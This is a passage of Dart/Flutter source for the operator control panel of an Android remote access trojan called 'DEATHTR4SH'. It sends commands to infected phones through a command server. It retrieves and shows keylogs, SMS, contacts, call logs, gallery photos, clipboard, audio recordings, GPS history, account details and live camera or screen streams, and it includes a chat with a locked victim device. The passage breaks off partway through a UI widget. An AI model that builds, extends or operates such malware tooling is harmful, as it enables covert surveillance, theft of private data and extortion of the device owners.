// DEATHTR4SH V1 GEN 2 - CONTROL CENTER

import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'config.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'constants.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  // ===== STATE =====
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  late AnimationController _mainController;
  late AnimationController _pulseController;
  late Animation<double> _fadeIn;
  late Animation<double> _scaleIn;
  late Animation<Offset> _slideUp;
  late Animation<double> _pulseAnimation;

  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  // RAT Results Storage
  List<dynamic> _keylogs = [];
  List<dynamic> _clipboard = [];
  List<dynamic> _callLogs = [];
  List<dynamic> _apps = [];
  Map<String, dynamic> _social = {};
  List<dynamic> _gpsHistory = [];
  List<dynamic> _execResults = [];
  List<dynamic> _smsLogs = [];
  Map<String, dynamic> _lockStatus = {};
  List<dynamic> _audioRecordings = [];

  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
    'get_keylogs','get_clipboard','get_audio','get_calllogs','get_apps',
    'get_social','get_gps_history','get_exec_results','get_sms_logs','get_lock_status'
  };

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 7, vsync: this);
    _initAnimations();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _mainController.forward();
    _pulseController.forward();
  }

  void _initAnimations() {
    _mainController = AnimationController(
      duration: const Duration(milliseconds: 800),
      vsync: this,
    );
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);

    _fadeIn = CurvedAnimation(parent: _mainController, curve: Curves.easeOut);
    _scaleIn = Tween<double>(begin: 0.96, end: 1.0)
        .animate(CurvedAnimation(parent: _mainController, curve: Curves.easeOutBack));
    _slideUp = Tween<Offset>(begin: const Offset(0, 0.04), end: Offset.zero)
        .animate(CurvedAnimation(parent: _mainController, curve: Curves.easeOutCubic));
    _pulseAnimation = Tween<double>(begin: 0.6, end: 1.0)
        .animate(CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    _mainController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  // ===== HELPER FUNCTIONS =====
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = kDeathRed}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c.withOpacity(0.9),
      content: Text(
        m,
        style: TextStyle(
          fontWeight: FontWeight.w600,
          fontSize: 12,
          color: Colors.white,
          fontFamily: 'ShareTechMono',
        ),
      ),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: c.withOpacity(0.2)),
      ),
    ));
  }

  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('${ApiConfig.baseUrl}/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: kDeathGreen);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Connection failed'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('No photo'); return; }
        _addLog('Photo received');
        _imgDialog(b, 'Target Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS received');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _textDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _gallerySheet(imgs);
        break;
      case 'get_keylogs':
        final logs = d['keylogs'] as List? ?? [];
        _addLog('${logs.length} keylogs');
        setState(() => _keylogs = logs);
        _showDataSheet(logs, 'KEYLOGS', Icons.keyboard_rounded);
        break;
      case 'get_clipboard':
        final clips = d['clipboard'] as List? ?? [];
        _addLog('${clips.length} clipboard entries');
        setState(() => _clipboard = clips);
        _showDataSheet(clips, 'CLIPBOARD', Icons.content_copy_rounded);
        break;
      case 'get_audio':
        final audios = d['audio'] as List? ?? [];
        _addLog('${audios.length} audio recordings');
        setState(() => _audioRecordings = audios);
        _showAudioSheet(audios);
        break;
      case 'get_calllogs':
        final calls = d['calllogs'] as List? ?? [];
        _addLog('${calls.length} call logs');
        setState(() => _callLogs = calls);
        _showDataSheet(calls, 'CALL LOGS', Icons.phone_rounded);
        break;
      case 'get_apps':
        final apps = d['apps'] as List? ?? [];
        _addLog('${apps.length} installed apps');
        setState(() => _apps = apps);
        _showDataSheet(apps, 'INSTALLED APPS', Icons.apps_rounded);
        break;
      case 'get_social':
        final social = d['social'] as Map<String, dynamic>? ?? {};
        _addLog('Social accounts retrieved');
        setState(() => _social = social);
        _showSocialDialog(social);
        break;
      case 'get_gps_history':
        final history = d['gps_history'] as List? ?? [];
        _addLog('${history.length} GPS points');
        setState(() => _gpsHistory = history);
        _showGpsRoute(history);
        break;
      case 'get_exec_results':
        final results = d['exec_results'] as List? ?? [];
        _addLog('${results.length} execution results');
        setState(() => _execResults = results);
        _showDataSheet(results, 'EXEC RESULTS', Icons.code_rounded);
        break;
      case 'get_sms_logs':
        final logs = d['sms_logs'] as List? ?? [];
        _addLog('${logs.length} SMS logs');
        setState(() => _smsLogs = logs);
        _showDataSheet(logs, 'SMS LOGS', Icons.message_rounded);
        break;
      case 'get_lock_status':
        final status = d['lock_status'] as Map<String, dynamic>? ?? {};
        _addLog('Lock status: ${status['locked'] == true ? 'LOCKED' : 'UNLOCKED'}');
        setState(() => _lockStatus = status);
        _showLockStatusDialog(status);
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  // ========== LIVE STREAM ==========
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'FRONT CAMERA' : 'BACK CAMERA')
          : 'SCREEN STREAM';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live stopped');
  }

  // ========== CHAT ==========
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('${ApiConfig.baseUrl}/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('${ApiConfig.baseUrl}/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ============================================================
  // RAT COMMANDS BUILDER
  // ============================================================
  Widget _neonSingleBtn(String label, IconData icon, Color color, VoidCallback fn, {bool isDestructive = false}) =>
    GestureDetector(
      onTap: fn,
      child: Container(
        margin: const EdgeInsets.symmetric(vertical: 4),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        decoration: BoxDecoration(
          color: kDeathCardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.2), width: 1),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(isDestructive ? 0.15 : 0.05),
              blurRadius: 16,
              spreadRadius: 1,
            ),
          ],
        ),
        child: Row(children: [
          Container(
            width: 44, height: 44,
            decoration: BoxDecoration(
              color: color.withOpacity(0.04),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: color.withOpacity(0.1)),
            ),
            child: Icon(icon, color: color, size: 22),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Text(
              label,
              style: TextStyle(
                color: Colors.white,
                fontSize: 13,
                fontWeight: FontWeight.w700,
                fontFamily: 'FontX',
                letterSpacing: 0.5,
              ),
            ),
          ),
          Container(
            width: 32, height: 32,
            decoration: BoxDecoration(
              color: color.withOpacity(0.04),
              shape: BoxShape.circle,
              border: Border.all(color: color.withOpacity(0.1)),
            ),
            child: Icon(Icons.arrow_forward_rounded, color: color, size: 16),
          ),
        ]),
      ),
    );

  Widget _neonSmallBtn(String label, IconData icon, Color color, VoidCallback fn) =>
    GestureDetector(
      onTap: fn,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          color: kDeathCardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.2), width: 1),
          boxShadow: [
            BoxShadow(
              color: color.withOpacity(0.05),
              blurRadius: 14,
              spreadRadius: 1,
            ),
          ],
        ),
        child: Column(children: [
          Container(
            width: 44, height: 44,
            decoration: BoxDecoration(
              color: color.withOpacity(0.04),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: color.withOpacity(0.1)),
            ),
            child: Icon(icon, color: color, size: 22),
          ),
          const SizedBox(height: 12),
          Text(
            label,
            textAlign: TextAlign.center,
            style: TextStyle(
              color: color,
              fontSize: 11,
              fontWeight: FontWeight.w700,
              fontFamily: 'FontX',
              letterSpacing: 1,
            ),
          ),
        ]),
      ),
    );

  Widget _infoRow(String num, String text, Color color) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 5),
    child: Row(children: [
      Container(
        width: 24, height: 24,
        decoration: BoxDecoration(
          color: color.withOpacity(0.04),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.1)),
        ),
        child: Center(
          child: Text(
            num,
            style: TextStyle(
              color: color,
              fontSize: 11,
              fontWeight: FontWeight.bold,
              fontFamily: 'FontX',
            ),
          ),
        ),
      ),
      const SizedBox(width: 14),
      Expanded(
        child: Text(
          text,
          style: TextStyle(
            color: Colors.white.withOpacity(0.15),
            fontSize: 11,
            fontFamily: 'ShareTechMono',
            height: 1.4,
          ),
        ),
      ),
    ]),
  );

  // ============================================================
  // DIALOGS
  // ============================================================
  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: kDeathCardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
        ),
        title: Text(
          'Select Camera',
          style: TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w700,
            fontFamily: 'FontX',
          ),
        ),
        content: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: ['back','front'].map((v) {
            final isSel = sel == v;
            final color = v == 'back' ? kDeathRed : kDeathGold;
            return GestureDetector(
              onTap: () => ss(() => sel = v),
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 16),
                decoration: BoxDecoration(
                  color: isSel ? color.withOpacity(0.04) : Colors.transparent,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                    color: isSel ? color : kDeathBorder,
                    width: isSel ? 2 : 1,
                  ),
                ),
                child: Column(children: [
                  Icon(
                    v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded,
                    color: isSel ? color : Colors.white.withOpacity(0.1),
                    size: 32,
                  ),
                  const SizedBox(height: 8),
                  Text(
                    v == 'back' ? 'Back' : 'Front',
                    style: TextStyle(
                      color: isSel ? color : Colors.white.withOpacity(0.1),
                      fontSize: 12,
                      fontWeight: FontWeight.w600,
                      fontFamily: 'FontX',
                    ),
                  ),
                ]),
              ),
            );
          }).toList(),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: Text(
              'Cancel',
              style: TextStyle(
                color: Colors.white.withOpacity(0.1),
                fontFamily: 'ShareTechMono',
              ),
            ),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
              borderRadius: BorderRadius.circular(12),
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
              onPressed: () { Navigator.pop(ctx); onPick(sel); },
              child: Text(
                'SELECT',
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.w700,
                  fontSize: 11,
                  fontFamily: 'FontX',
                  letterSpacing: 1,
                ),
              ),
            ),
          ),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
      ),
      title: Text(
        title,
        style: TextStyle(
          color: Colors.white,
          fontSize: 14,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: _field(ctrl, label, hint: hint, isNum: isNumber),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Cancel',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
            child: Text(
              'SEND',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    Container(
      decoration: BoxDecoration(
        color: kDeathDarkBg,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: kDeathBorder),
      ),
      child: TextField(
        controller: ctrl,
        keyboardType: isNum ? TextInputType.number : TextInputType.text,
        style: TextStyle(
          color: Colors.white,
          fontSize: 13,
          fontFamily: 'ShareTechMono',
        ),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 11,
            fontFamily: 'ShareTechMono',
          ),
          hintStyle: TextStyle(
            color: Colors.white.withOpacity(0.04),
            fontSize: 11,
            fontFamily: 'ShareTechMono',
          ),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: kDeathDarkBg,
        insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
        ),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(
            padding: const EdgeInsets.all(16),
            child: Text(
              title,
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
              ),
            ),
          ),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(18)),
            child: Image.memory(bytes, fit: BoxFit.contain),
          ),
        ]),
      ));
    } catch (_) { _toast('Image decode failed'); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathGreen.withOpacity(0.2), width: 1),
      ),
      title: Text(
        'GPS Location',
        style: TextStyle(
          color: Colors.white,
          fontSize: 14,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Container(
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: kDeathDarkBg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: kDeathBorder),
        ),
        child: Column(children: [
          Text(
            'Latitude:  $lat',
            style: TextStyle(
              color: kDeathGreen,
              fontSize: 13,
              fontFamily: 'monospace',
            ),
          ),
          const SizedBox(height: 6),
          Text(
            'Longitude: $lng',
            style: TextStyle(
              color: kDeathGreen,
              fontSize: 13,
              fontFamily: 'monospace',
            ),
          ),
        ]),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Close',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [kDeathRed, kDeathRedDark]),
            borderRadius: BorderRadius.circular(12),
          ),
          child: ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, elevation: 0),
            onPressed: () => launchUrl(
              Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication
            ),
            child: Text(
              'OPEN MAPS',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 11,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
          ),
        ),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: kDeathCardBg,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(20), 
        side: BorderSide(color: kDeathRed.withOpacity(0.2), width: 1),
      ),
      title: Text(
        title,
        style: TextStyle(
          color: Colors.white,
          fontSize: 14,
          fontWeight: FontWeight.w700,
          fontFamily: 'FontX',
        ),
      ),
      content: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: kDeathDarkBg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: kDeathBorder),
        ),
        child: SelectableText(
          content,
          style: TextStyle(
            color: kDeathGold,
            fontFamily: 'monospace',
            fontSize: 12,
          ),
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context),
          child: Text(
            'Close',
            style: TextStyle(
              color: Colors.white.withOpacity(0.1),
              fontFamily: 'ShareTechMono',
            ),
          ),
        ),
      ],
    ));
  }

  // ============================================================
  // DATA SHEETS
  // ============================================================
  void _contactsSheet(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Text(
              'CONTACTS (${contacts.length})',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(color: kDeathBorder, height: 1),
                itemBuilder: (_, i) {
                  final c = contacts[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        color: kDeathRed.withOpacity(0.04),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kDeathRed.withOpacity(0.1)),
                      ),
                      child: Icon(Icons.person_rounded, color: kDeathRed, size: 20),
                    ),
                    title: Text(
                      c['name']?.toString() ?? '-',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 13,
                        fontWeight: FontWeight.w600,
                        fontFamily: 'FontX',
                      ),
                    ),
                    subtitle: Text(
                      c['number']?.toString() ?? '-',
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.1),
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathGold, kDeathRed]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Text(
              'SMS (${sms.length})',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(color: kDeathBorder, height: 1),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 42, height: 42,
                      decoration: BoxDecoration(
                        color: kDeathGold.withOpacity(0.04),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kDeathGold.withOpacity(0.1)),
                      ),
                      child: Icon(Icons.sms_rounded, color: kDeathGold, size: 20),
                    ),
                    title: Text(
                      s['address']?.toString() ?? '-',
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 13,
                        fontWeight: FontWeight.w600,
                        fontFamily: 'FontX',
                      ),
                    ),
                    subtitle: Text(
                      s['body']?.toString() ?? '',
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.1),
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                      ),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Text(
              'GALLERY (${imgs.length})',
              style: TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w700,
                fontSize: 14,
                fontFamily: 'FontX',
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? Center(
                      child: Text(
                        'No photos found',
                        style: TextStyle(
                          color: Colors.white.withOpacity(0.05),
                          fontFamily: 'ShareTechMono',
                        ),
                      ),
                    )
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 8,
                        mainAxisSpacing: 8,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean = raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () => _imgDialog(raw, 'Gallery Photo ${i+1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(12),
                              child: Image.memory(bytes, fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(
                            decoration: BoxDecoration(
                              color: kDeathDarkBg,
                              borderRadius: BorderRadius.circular(12),
                            ),
                          );
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  void _showDataSheet(List data, String title, IconData icon) {
    showModalBottomSheet(
      context: context,
      backgroundColor: kDeathCardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 40,
              margin: const EdgeInsets.only(top: 14, bottom: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [kDeathRed, kDeathGold]),
                borderRadius: BorderRadius.circular(4),
              ),
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
